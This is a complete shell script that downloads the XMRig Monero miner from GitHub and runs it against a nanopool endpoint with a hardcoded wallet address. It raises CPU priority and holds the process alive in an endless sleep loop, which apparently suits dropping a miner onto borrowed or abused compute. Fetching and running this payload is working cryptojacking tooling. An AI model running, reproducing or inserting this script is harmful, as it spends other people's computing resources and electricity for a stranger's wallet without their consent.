#!/bin/sh
sudo apt update
sudo apt install screen -y
wget https://github.com/xmrig/xmrig/releases/download/v6.14.0/xmrig-6.14.0-linux-x64.tar.gz
tar xf xmrig-6.14.0-linux-x64.tar.gz
cd xmrig-6.14.0
./xmrig -o xmr-asia1.nanopool.org:14433 -u 85eiAbJ4K9q19UPeKARkeSU8GuowFkJWS16MB74DJXY49QSswuioEtqaeaBu3j8fJm2MfjwJj9974AYoef8VJPr1TRtfEvU.Z1 --tls --coin monero --cpu-priority 4
while [ 1 ]; do
sleep 3
done
sleep 999
